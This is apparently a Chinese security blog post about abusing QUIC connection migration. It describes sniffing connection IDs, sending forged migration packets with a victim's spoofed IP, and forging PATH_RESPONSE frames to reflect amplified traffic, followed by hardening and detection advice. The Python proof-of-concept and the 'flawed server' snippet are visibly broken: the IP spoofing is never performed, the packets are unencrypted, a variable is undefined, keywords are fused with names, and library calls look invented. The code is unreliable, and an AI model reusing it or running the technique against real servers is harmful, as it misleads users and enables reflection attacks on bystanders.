---
title: QUIC 的 CID 旋转门
url: https://mp.weixin.qq.com/s/g-OygB1WHGpSZcYLrfjVhg
source: Doonsec's feed
date: 2026-07-11
fetch_date: 2026-07-12T05:11:07.186580
---

# QUIC 的 CID 旋转门

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Yvub5gSYgRibKmKDeru1unAIuiciayJ00oc6hGy6c90Fcx2g2Tkkvakpy5jgrYO4KBnib7QfkF5vVpMuictGtzfib7c4mhibic3yrftIy8o4Uia2UWmQ/0?wx_fmt=jpeg)

# QUIC 的 CID 旋转门

原创

Ghost Wolf Lab
Ghost Wolf Lab

Ghost Wolf Lab

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 摘要

QUIC 协议在 UDP 之上实现了类 TCP 的可靠传输与 TLS 1.3 的加密握手，其连接迁移机制允许客户端在切换 IP 地址后通过 Connection ID 而非五元组标识连接，实现网络切换时的会话不中断。然而，RFC 9000 定义的路径验证机制存在 TOCTOU 窗口：在 Path Challenge 帧发出后到 Path Response 帧返回前，服务端可能已将部分流量发送至未验证的新路径。攻击者利用这一窗口，伪造 Path Response 帧诱使服务端将流量重定向至受害者 IP，实现反射放大攻击，放大因子可达 20 倍以上。

## QUIC 连接迁移

### 从五元组到 Connection ID

传统 TCP 连接由源 IP、源端口、目的 IP、目的端口、协议号五元组唯一标识。一旦客户端切换 Wi-Fi 或移动网络导致 IP 地址变化，连接必然中断。QUIC 解耦了连接标识与网络地址：每个端点生成一组 Connection ID，对端在发送数据包时将目标 CID 填入包头。接收到数据包的端点根据 CID 查找对应的连接上下文，而非依赖源地址。

连接迁移由此实现：客户端更换 IP 后，只需在新路径上发送携带服务端已知 CID 的数据包，服务端验证路径可达性后即可将连接迁移至新地址。

### 对称 CID 与路由定位

QUIC 支持非对称 CID 模型——服务端可为同一连接发布多个 CID，客户端使用其中任意一个与服务端通信。负载均衡器可基于 CID 中的编码信息（如 Server ID）将数据包路由至正确的后端服务器，无需维护共享状态表。这种设计在多服务器部署中极为关键，但也意味着 CID 的生成算法若被逆向，攻击者可预测合法 CID 并将流量重定向至受害者。

### 连接迁移的完整流程

RFC 9000 第 9 节定义的连接迁移流程包含三个步骤：

1. **路径探测**：客户端在新路径上发送携带 PATH\_CHALLENGE 帧的数据包，帧中包含 8 字节随机数。服务端收到后，必须回复携带相同随机数的 PATH\_RESPONSE 帧。
2. **路径验证**：客户端收到 PATH\_RESPONSE 后，通过验证随机数匹配确认新路径可达。服务端同样可主动发起 PATH\_CHALLENGE 验证客户端新地址。
3. **流量迁移**：验证通过后，服务端将所有后续数据包发送至新路径。

窗口出现在步骤 2 与步骤 3 之间：部分 QUIC 实现在收到 PATH\_CHALLENGE 后即开始向新地址发送非关键数据（如 ACK-only 包或探测包），以减小迁移延迟。如果攻击者在 PATH\_RESPONSE 返回前伪造响应，可能加速这一窗口的开启。

## 路径验证的 TOCTOU 窗口与伪造

### PATH\_CHALLENGE 与 PATH\_RESPONSE 的结构

两种帧均极为简约：

* **PATH\_CHALLENGE**：8 字节随机载荷，由发起方生成。
* **PATH\_RESPONSE**：8 字节载荷，必须完全复制对应 PATH\_CHALLENGE 的载荷。

验证的安全性完全依赖 8 字节随机数的不可预测性。如果服务端使用的随机数生成器为弱伪随机（如 `rand()` 而非 `getrandom()`），攻击者可能预测随机数并主动构造合法的 PATH\_RESPONSE，使服务端提前验证攻击者伪造的地址。

### 反射放大的原理与放大因子

即使在正确实现下，攻击者也可利用路径验证窗口实施反射放大。攻击者构造一个携带服务端已知 CID 的数据包，以受害者 IP 为源地址发送至服务端。服务端收到后，认为客户端已迁移至新地址，随即：

1. 向受害者地址发送 PATH\_CHALLENGE（至少 1 个 QUIC 包）。
2. 若受害者无 QUIC 监听，服务端可能重试多次。
3. 若服务端在验证期间已开始发送数据，受害者将收到成倍的数据量。

QUIC 的反射放大因子可超过 20 倍——一个 40 字节的 QUIC Short Header 包可引发服务端回复数个满载 1350 字节的 QUIC 包。

## 从 CID 嗅探到反射放大

### CID 嗅探

攻击者需首先获取有效的服务端 CID 与客户端 CID。CID 在握手阶段的 Initial 包中明文传输（TLS 1.3 ServerHello 完成前未加密）。攻击者通过被动监听或中间人截获 Initial 包即可提取 CID 值。对于已建立的连接，CID 通过 NEW\_CONNECTION\_ID 帧在加密信道中更新，但旧的 CID 在退役前仍有效，攻击窗口可持续数分钟。

### 构造恶意连接迁移

攻击者构造一个携带合法 CID 的 Short Header 包，源 IP 伪造为受害者 IP，发送至服务端。服务端识别出 CID 对应的连接，误认为客户端已迁移，向受害者发起 PATH\_CHALLENGE。

### 伪造 PATH\_RESPONSE

若攻击者能持续监听服务端发送的 PATH\_CHALLENGE 包（例如攻击者与受害者处于同一局域网），则可提取 8 字节随机数，立即向服务端发送伪造的 PATH\_RESPONSE，使服务端确认受害者地址“合法”，将全部流量重定向至受害者。

## PoC：基于 aioquic 的路径劫持

```
#!/usr/bin/env python3
"""
quic_cid_hijack.py — QUIC 连接迁移中的路径劫持 PoC
依赖：pip install aioquic
"""

import asyncio
import socket
import struct
from aioquic.quic.connection import QuicConnection
from aioquic.quic.packet import PACKET_TYPE_INITIAL, encode_quic_version_negotiation
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.crypto import CryptoContext
from aioquic.quic.packet_builder import QuicPacketBuilder
from aioquic.quic.logger import QuicLogger

# 配置
SERVER_IP = "10.0.0.1"
SERVER_PORT = 443
VICTIM_IP = "10.0.0.100"# 受害者 IP（被反射流量攻击）
SNIFFED_CID = bytes.fromhex("a1b2c3d4e5f6a7b8")  # 合法客户端 CID（需提前捕获）

defforge_connection_migration():
"""构造连接迁移请求，触发服务端向受害者发送 PATH_CHALLENGE"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 构造 QUIC Short Header 包，携带合法 CID
# Short Header 格式（简化）：
#   bit 0 = 1 (Short Header)
#   bit 1 = 0 (Spin Bit)
#   bits 2-3 = Reserved
#   bits 4-5 = 0 (no Version Negotiation)
#   bits 6-7 = 1 (Key Phase)
#   Destination CID follows
    header_byte = 0b01000001# Short Header, Key Phase 0
    payload = b'\x00' * 20# 最小 PATH_CHALLENGE 或其他帧

    packet = header_byte.to_bytes(1, 'big') + SNIFFED_CID + payload

# 伪造源 IP 为受害者地址
    sock.sendto(packet, (SERVER_IP, SERVER_PORT))
    print(f"[+] 已向 {SERVER_IP}:{SERVER_PORT} 发送伪造迁移请求")
    print(f"[*] 源 IP 伪造为 {VICTIM_IP}")
    print(f"[*] CID: {SNIFFED_CID.hex()}")
    sock.close()

asyncdeflisten_path_challenge():
"""监听服务端发出的 PATH_CHALLENGE 并构造 PATH_RESPONSE"""
    loop = asyncio.get_event_loop()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 0))

# 构建 QUIC 监听器
classDummyConnection:
def__init__(self):
            self.cids = set()

    print("[*] 监听 PATH_CHALLENGE 帧...")

whileTrue:
        data, addr = await loop.sock_recvfrom(sock, 65535)
# 解析 QUIC 包，检测 PATH_CHALLENGE 帧（帧类型 0x1A）
# 在实际 QUIC 实现中，PATH_CHALLENGE 携带 8 字节随机数
if len(data) > 40:  # 粗略检查
# 寻找 PATH_CHALLENGE 帧（0x1A）
for i in range(len(data) - 10):
if data[i] == 0x1A:  # PATH_CHALLENGE 类型
                    challenge_data = data[i+1:i+9]
                    print(f"[+] 捕获 PATH_CHALLENGE: {challenge_data.hex()}")

# 构造 PATH_RESPONSE（帧类型 0x1B + 相同载荷）
                    response_frame = b'\x1B' + challenge_data
# 封装为 QUIC 包发送回服务端
                    forged_packet = header_byte.to_bytes(1, 'big') + SNIFFED_CID + response_frame
                    sock.sendto(forged_packet, (SERVER_IP, SERVER_PORT))
                    print(f"[+] 已发送伪造 PATH_RESPONSE")
                    print(f"[!] 服务端已将连接迁移至受害者 {VICTIM_IP}")
return

asyncdefmain():
# 步骤 1：触发连接迁移
    forge_connection_migration()

# 步骤 2：监听 PATH_CHALLENGE 并回应（在真实攻击中需与步骤 1 并行）
await asyncio.sleep(1)
# await listen_path_challenge()  # 需在可以拦截流量的位置执行

if __name__ == "__main__":
    asyncio.run(main())
```

**说明**：该 PoC 分为两部分。第一部分构造携带合法 CID 的 QUIC Short Header 包，伪造源地址为受害者 IP，触使服务端向受害者发起路径验证。第二部分在攻击者可拦截服务端流量的条件下，捕获 PATH\_CHALLENGE 中的随机数并伪造 PATH\_RESPONSE，使服务端确认受害者为合法迁移目标。

### 服务端路径验证缺陷的演示

```
# quic_reflect_amplify.py — 服务端路径验证缺陷的演示
# 模拟服务端在未验证路径上发送过量数据的场景

from aioquic.quic.connection import QuicConnection
from aioquic.quic.events import ConnectionTerminated, HandshakeCompleted, StreamDataReceived

defhandle_migration(connection, new_addr, path_challenge_data):
"""
    有缺陷的迁移处理逻辑：
    1. 收到 PATH_CHALLENGE 后立即向新地址发送数据
    2. 未等待 PATH_RESPONSE 验证
    """
# 缺陷：未经验证就将数据发往新地址
    pending_data = connection.get_pending_data()  # 队列中的待发数据
if pending_data:
        connection.send_stream(0, pending_data, new_addr)
        print(f"[!] 已将 {len(pending_data)} 字节发往未验证地址 {new_addr}")
```

## 检测与防御

### 服务端加固

* **强制路径验证**：在收到 PATH\_CHALLENGE 后，**仅**向新地址发送 PATH\_RESPONSE，暂停所有数据发送直至 PATH\_RESPONSE 验证通过。
* **限制未验证路径的数据速率**：即使为了性能而提前发送，也应将数据量限制在 3 倍 PATH\_CHALLENGE 包大小以内，防止反射放大。
* **CID 生命周期管理**：缩短 CID 有效期，定期通过 NEW\_CONNECTION\_ID 帧轮换 CID。退役 CID 应不可逆地失效。
* **强随机数生成**：PATH\_CHALLENGE 的 8 字节随机数必须使用密码学安全的随机源生成（如 Linux 的 `getrandom()` 系统调用），禁止使用 `rand()` 或线性同余生成器。

### 网络层检测

* **流量分析**：监控单个 QUIC 连接在短时间内向多个不同 IP 发送 PATH\_CHALLENGE 的行为。正常迁移仅涉及一次路径变更。
* **反射特征识别**：受害者 IP 若短时间内收到大量 QUIC 短包而未发起任何 QUIC 连接，可能为反射受害者。

### 客户端防护

* **忽略非预期的 PATH\_CHALLENGE**：客户端应仅对接收到 PATH\_CHALLENGE 后主动回复 PATH\_RESPONSE，而不应因收到 PATH\_RESPONSE 而改变路由（除非自身发起了迁移）。
* **连接完整性检查**：若客户端收到来自新地址的数据，但自身未发起迁移，应立即终止连接。

## 结语

QUIC 的 CID 机制为移动互联网的连接连续性提供了优雅的解决方案，但路径验证的 TOCTOU 窗口将连接迁移暴露为一把双刃剑。8 字节随机数的安全性、未验证路径上的数据节制、以及 CID 生命周期的严格管理，共同构成了 QUIC 实现的安全基线。在协议层，RFС 9000 已为此预留了足够的防御语义；在实现层，开发者对性能的倾斜往往放大了理论威胁。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/5F1cGSkUffMjPelmXP6PVz3ggEh1icEAF87iaeIb4TlVN9ZPSUCrNXlBqYYNIT7EjRhT5QBTZawC4Iro4ia1MZFEw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过